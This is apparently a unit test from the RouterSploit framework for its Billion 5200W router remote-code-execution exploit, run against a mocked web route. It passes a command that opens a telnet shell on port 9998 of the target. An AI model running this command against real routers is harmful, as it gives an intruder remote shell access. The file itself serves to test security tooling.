from routersploit.modules.exploits.routers.billion.billion_5200w_rce import Exploit


def test_check_success(target):
    """ Test scenario - successful check """

    route_mock = target.get_route_mock("/cgi-bin/adv_remotelog.asp", methods=["POST"])
    route_mock.return_value = (
        "TEST"
    )

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 80

    exploit.target = target.host
    exploit.port = target.port

    assert exploit.check() is None
    assert exploit.run() is None
    assert exploit.execute1("utelnetd -l /bin/sh -p 9998 -d")
    assert exploit.execute2("utelnetd -l /bin/sh -p 9998 -d")
